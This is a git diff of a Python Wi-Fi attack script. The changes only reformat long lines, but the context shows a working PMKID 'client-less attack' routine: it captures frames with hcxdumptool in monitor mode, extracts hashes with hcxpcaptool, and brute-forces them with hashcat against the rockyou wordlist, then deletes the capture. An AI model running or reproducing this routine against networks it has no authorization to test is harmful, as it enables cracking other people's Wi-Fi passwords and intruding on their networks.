@@ -105,12 +105,15 @@ def attack_func(network_interface, attack_mode):
         get_colours("Starting the PKMID Client-Less ATTACK", "magenta")
         time.sleep(3)
         get_colours("", "yellow")
-        subprocess.run(["timeout", "60", "sudo", "hcxdumptool", "-i", network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
+        subprocess.run(
+            ["timeout", "60", "sudo", "hcxdumptool", "-i", network_interface + "mon", "--enable_status=1", "-o",
+             "Capture_PKMID"])
         get_colours("\nClearing Temporary files..", "red")
         time.sleep(3)
         get_colours("", "yellow")
         subprocess.run(["clear"])
-        get_pkmid_hashes = subprocess.run(["sudo", "hcxpcaptool", "-z", "myHashes_PKMID", "Capture_PKMID"], capture_output=True, text=True)
+        get_pkmid_hashes = subprocess.run(["sudo", "hcxpcaptool", "-z", "myHashes_PKMID", "Capture_PKMID"],
+                                          capture_output=True, text=True)
         subprocess.run(["clear"])
         get_colours("\nTrying getting hashes", "magenta")
         subprocess.run(["rm", "Capture_PKMID"])
@@ -118,7 +121,8 @@ def attack_func(network_interface, attack_mode):
             get_colours("\nStarting with Brute-Force attack..", "cyan")
             time.sleep(3)
             get_colours("", "yellow")
-            subprocess.run(["sudo", "hashcat", "-m", "16800", "-a", "0", "-w", "4", "myHashes_PKMID", "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
+            subprocess.run(["sudo", "hashcat", "-m", "16800", "-a", "0", "-w", "4", "myHashes_PKMID",
+                            "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
         else:
             get_colours("\nno packet captured...", "red")
 
@@ -130,6 +134,7 @@ def ctrl_c(signal_received, frame):
     get_colours("Network set to it's normal mode...", "magenta")
     get_colours("\n[*] Exiting the program...", "blue")
     exit(1)
+
 
 def check_parms():
     if len(sys.argv) > 1:
